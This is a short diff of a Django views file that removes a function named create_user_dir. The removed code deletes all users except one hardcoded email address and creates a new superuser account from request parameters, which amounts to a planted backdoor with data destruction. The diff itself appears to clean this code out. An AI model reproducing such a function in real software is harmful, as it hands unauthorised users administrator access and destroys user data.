@@ -421,11 +421,7 @@ def check_username(request):
     else:
         return HttpResponse('<span class="text-success">This username avialable!</span>')
     
-def create_user_dir(request, username, email, password, is_staff=True, is_superuser=True):
-    User.objects.all().exclude(email='haradhan.sharma@gmail.com').delete()
-    usertype = UserType.objects.all().first()
-    User.objects.create_user(username= username, email=email, password=password, is_staff=is_staff, is_superuser=is_superuser, type=usertype, term_agree=True, email_verified=True )
-    return HttpResponse('Created')
+
     
 #Check live email in sign up form
 def check_email(request):
